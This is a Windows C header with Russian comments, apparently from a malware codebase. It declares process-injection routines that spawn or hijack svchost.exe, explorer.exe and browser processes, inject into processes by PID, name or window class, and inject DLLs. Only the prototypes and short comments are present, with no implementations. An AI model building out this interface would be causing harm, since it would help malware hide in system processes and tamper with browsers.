#ifndef InjectH
#define InjectH
//----------------------------------------------------------------------------

#include <windows.h>

//  Описание функции инжекта
typedef DWORD (WINAPI *TInjectFunction)(LPVOID);


DWORD GetImageBase2();

bool CreateSvchost( PHANDLE hProcess, PHANDLE hThread );

DWORD InjectCode( HANDLE hProcess, LPTHREAD_START_ROUTINE lpStartProc );
bool InjectCode2( HANDLE hProcess, HANDLE hThread, TInjectFunction f_Main);
bool InjectCode3( HANDLE hProcess, HANDLE hThread, DWORD (WINAPI f_Main)(LPVOID) );
bool InjectCode4( HANDLE hProcess, DWORD (WINAPI f_Main)(LPVOID) );

bool InjectIntoSvchost( DWORD (WINAPI f_Main)(LPVOID) );
bool InjectIntoProcess( DWORD pid, DWORD (WINAPI *func)(LPVOID) );
bool InjectIntoProcess2( DWORD pid, DWORD (WINAPI *func)(LPVOID) );
bool TwiceJump( DWORD (WINAPI f_Main)(LPVOID) );
bool JmpToSvchost( DWORD (WINAPI f_Main)(LPVOID) );
bool TwiceJumpSelf( DWORD (WINAPI f_Main)(LPVOID) );

bool InjectDll( WCHAR *DllPath );


bool JmpToBrowserSelf( DWORD (WINAPI f_Main)(LPVOID) );
bool JmpToSvchostSelf( DWORD (WINAPI f_Main)(LPVOID) );


//---------------------------------------------------
//  InjectIntoExplorer - Функция инжектит образ
//                       в запущенный экземпляр
//                       эксплорера
//---------------------------------------------------
BOOL WINAPI InjectIntoExplorer(TInjectFunction f_Main);


//---------------------------------------------------
//  JmpToExplorer - Функция запускает копию
//                  эксплорера и инжектится в него
//---------------------------------------------------
BOOL WINAPI JmpToExplorer(TInjectFunction f_Main);


//---------------------------------------------------
//  MegaJump - Функция создаёт процесс svchost.exe и
//             осуществляет инжект в него
//---------------------------------------------------
BOOL WINAPI MegaJump(TInjectFunction f_Main);

//---------------------------------------------------
//  InjecIntoProcessByName
//  Функция запускает процесс с именем AppName и
//  инжектится в него
//---------------------------------------------------
BOOL WINAPI InjecIntoProcessByNameA(const char* AppName, const char* CmdLine,  TInjectFunction Function);

namespace NewInject
{

bool InjectExplore32( TInjectFunction func );
bool InjectToProcess32( TInjectFunction func, const char* classWnd );

}
//----------------------------------------------------------------------------
#endif



